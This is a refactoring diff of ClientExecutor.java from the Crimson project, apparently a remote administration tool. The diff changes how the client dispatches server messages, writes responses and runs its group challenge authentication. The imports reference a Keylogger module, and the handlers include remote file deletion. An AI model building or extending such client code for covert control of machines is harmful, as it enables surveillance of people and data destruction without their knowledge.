@@ -21,7 +21,6 @@ import java.awt.HeadlessException;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.IOException;
-import java.util.concurrent.TimeUnit;
 
 import javax.imageio.ImageIO;
 import javax.security.auth.DestroyFailedException;
@@ -36,13 +35,13 @@ import com.subterranean_security.crimson.client.modules.Keylogger;
 import com.subterranean_security.crimson.client.modules.Power;
 import com.subterranean_security.crimson.client.modules.QuickScreenshot;
 import com.subterranean_security.crimson.client.store.ConfigStore;
-import com.subterranean_security.crimson.client.store.ConnectionStore;
 import com.subterranean_security.crimson.client.stream.CInfoSlave;
 import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.misc.AuthenticationGroup;
 import com.subterranean_security.crimson.core.misc.HCP;
 import com.subterranean_security.crimson.core.net.BasicExecutor;
-import com.subterranean_security.crimson.core.net.ConnectionState;
+import com.subterranean_security.crimson.core.net.Connector.ConnectionState;
+import com.subterranean_security.crimson.core.net.MessageFuture.Timeout;
 import com.subterranean_security.crimson.core.platform.LocalFS;
 import com.subterranean_security.crimson.core.platform.Platform;
 import com.subterranean_security.crimson.core.proto.ClientAuth.MI_GroupChallengeResult;
@@ -64,6 +63,7 @@ import com.subterranean_security.crimson.core.proto.Screenshot.RS_QuickScreensho
 import com.subterranean_security.crimson.core.proto.State.RS_ChangeClientState;
 import com.subterranean_security.crimson.core.proto.Stream.Param;
 import com.subterranean_security.crimson.core.proto.Update.RS_GetClientConfig;
+import com.subterranean_security.crimson.core.store.ConnectionStore;
 import com.subterranean_security.crimson.core.store.FileManagerStore;
 import com.subterranean_security.crimson.core.stream.Stream;
 import com.subterranean_security.crimson.core.stream.StreamStore;
@@ -81,17 +81,14 @@ import io.netty.util.ReferenceCountUtil;
 public class ClientExecutor extends BasicExecutor {
 	private static final Logger log = LoggerFactory.getLogger(ClientExecutor.class);
 
-	private ClientConnector connector;
-
-	public ClientExecutor(ClientConnector vc) {
+	public ClientExecutor() {
 		super();
-		connector = vc;
 
 		dispatchThread = new Thread(() -> {
 			while (!Thread.currentThread().isInterrupted()) {
 				Message m;
 				try {
-					m = connector.mq.take();
+					m = connector.msgQueue.take();
 				} catch (InterruptedException e) {
 					return;
 				}
@@ -105,12 +102,10 @@ public class ClientExecutor extends BasicExecutor {
 						ev_chat_message(m);
 					} else if (m.hasRqGroupChallenge()) {
 						rq_group_challenge(m);
-					} else if (m.hasMiChallengeresult()) {
+					} else if (m.hasMiChallengeResult()) {
 						challengeResult_1w(m);
 					} else if (m.hasRqFileListing()) {
 						file_listing_rq(m);
-					} else if (m.hasMiAssignCvid()) {
-						assign_1w(m);
 					} else if (m.hasMiStreamStart()) {
 						stream_start_ev(m);
 					} else if (m.hasMiStreamStop()) {
@@ -138,7 +133,7 @@ public class ClientExecutor extends BasicExecutor {
 					} else if (m.hasRqAddTorrent()) {
 						rq_add_torrent(m);
 					} else {
-						connector.cq.put(m.getId(), m);
+						connector.addNewResponse(m);
 					}
 
 					ReferenceCountUtil.release(m);
@@ -146,7 +141,6 @@ public class ClientExecutor extends BasicExecutor {
 			}
 
 		});
-		dispatchThread.start();
 
 	}
 
@@ -199,7 +193,7 @@ public class ClientExecutor extends BasicExecutor {
 		}
 
 		if (outcome != null) {
-			connector.handle.write(Message.newBuilder().setId(m.getId()).setRid(m.getSid())
+			connector.write(Message.newBuilder().setId(m.getId()).setRid(m.getSid())
 					.setRsChangeClientState(RS_ChangeClientState.newBuilder().setOutcome(outcome)).build());
 
 		}
@@ -224,14 +218,14 @@ public class ClientExecutor extends BasicExecutor {
 
 		String result = CryptoUtil.hashSign(m.getRqGroupChallenge().getMagic(), groupKey);
 		RS_GroupChallenge rs = RS_GroupChallenge.newBuilder().setResult(result).build();
-		connector.handle.write(Message.newBuilder().setId(m.getId()).setRsGroupChallenge(rs).build());
+		connector.write(Message.newBuilder().setId(m.getId()).setRsGroupChallenge(rs).build());
 	}
 
 	private void challengeResult_1w(Message m) {
 		if (connector.getState() != ConnectionState.AUTH_STAGE1) {
 			return;
 		}
-		if (!m.getMiChallengeresult().getResult()) {
+		if (!m.getMiChallengeResult().getResult()) {
 			log.debug("Authentication with server failed");
 			connector.setState(ConnectionState.CONNECTED);
 			return;
@@ -251,13 +245,14 @@ public class ClientExecutor extends BasicExecutor {
 
 		final String magic = RandomUtil.randString(64);
 		RQ_GroupChallenge rq = RQ_GroupChallenge.newBuilder().setGroupName(group.getName()).setMagic(magic).build();
-		connector.handle.write(Message.newBuilder().setId(id).setRqGroupChallenge(rq).build());
+		connector.write(Message.newBuilder().setId(id).setRqGroupChallenge(rq).build());
 
 		new Thread(new Runnable() {
 			public void run() {
 				boolean flag = true;
 				try {
-					Message rs = connector.cq.take(id, 7, TimeUnit.SECONDS);
+					Message rs = connector.getResponse(id).get(7000);
+
 					if (rs != null) {
 						if (!CryptoUtil.verifyGroupChallenge(magic, groupKey, rs.getRsGroupChallenge().getResult())) {
 							log.info("Server challenge failed");
@@ -271,6 +266,9 @@ public class ClientExecutor extends BasicExecutor {
 				} catch (InterruptedException e) {
 					log.debug("No response to challenge");
 					flag = false;
+				} catch (Timeout e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
 				}
 
 				MI_GroupChallengeResult.Builder oneway = MI_GroupChallengeResult.newBuilder().setResult(flag);
@@ -283,7 +281,7 @@ public class ClientExecutor extends BasicExecutor {
 					// TODO handle more
 					connector.setState(ConnectionState.CONNECTED);
 				}
-				connector.handle.write(Message.newBuilder().setId(id).setMiChallengeresult(oneway.build()).build());
+				connector.write(Message.newBuilder().setId(id).setMiChallengeResult(oneway.build()).build());
 
 			}
 		}).start();
@@ -332,11 +330,6 @@ public class ClientExecutor extends BasicExecutor {
 		ConnectionStore.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(m.getRid())
 				.setRsDelete(RS_Delete.newBuilder()
 						.setOutcome(LocalFS.delete(m.getRqDelete().getTargetList(), m.getRqDelete().getOverwrite()))));
-	}
-
-	private void assign_1w(Message m) {
-		Common.cvid = m.getMiAssignCvid().getId();
-		DatabaseStore.getDatabase().store("cvid", Common.cvid);
 	}
 
 	private void stream_start_ev(Message m) {
